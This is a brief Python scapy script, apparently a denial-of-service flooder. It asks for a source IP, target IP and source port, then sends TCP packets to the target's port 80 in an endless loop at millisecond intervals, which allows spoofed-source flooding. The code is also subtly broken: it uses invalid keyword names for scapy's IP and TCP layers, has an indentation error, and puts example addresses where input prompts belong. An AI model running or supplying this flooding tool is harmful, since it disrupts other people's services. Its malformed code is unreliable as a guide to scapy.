from scapy.all import *
source_IP = input("192.168.1.48:")
target_IP = input("192.168.1.50:")
source_port = int(input("80:"))
i = 1

while True:
   IP1 = IP(source_IP = source_IP, destination = target_IP)
   TCP1 = TCP(srcport = source_port, dstport = 80)
   pkt = IP1 / TCP1
   send(pkt, inter = .001)
   
   print ("packet sent ", i)
      i = i + 1
